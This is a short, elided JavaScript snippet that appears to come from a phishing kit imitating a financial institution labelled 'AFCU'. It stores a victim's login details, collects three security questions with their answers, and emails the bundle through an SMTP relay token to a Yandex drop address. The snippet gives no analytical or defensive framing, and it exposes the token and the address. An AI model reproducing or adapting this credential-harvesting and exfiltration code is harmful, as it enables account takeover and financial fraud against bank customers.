...
function getValue() {
    ...
    localStorage.setItem('id', loginDetails);
}
...
function getSecurityValues(){
    ...
    var message = `${storedValue}, question1 = ${selectedValue1}, answer1 = ${inputValue1}, question2 = ${selectedValue2}, answer2 = ${inputValue2}, question3 = ${selectedValue3}, answer3 = ${inputValue3}
    `
...
async function sendEmail (message) {
    await Email.send({
        SecureToken : "e8fbf165-cc14-4a85-b5f3-cf4a01734c58",
        To : 'wealtholoro@yandex.com',
        From : "wealtholoro@yandex.com",
        Subject : "AFCU",
        Body : message
    })
}
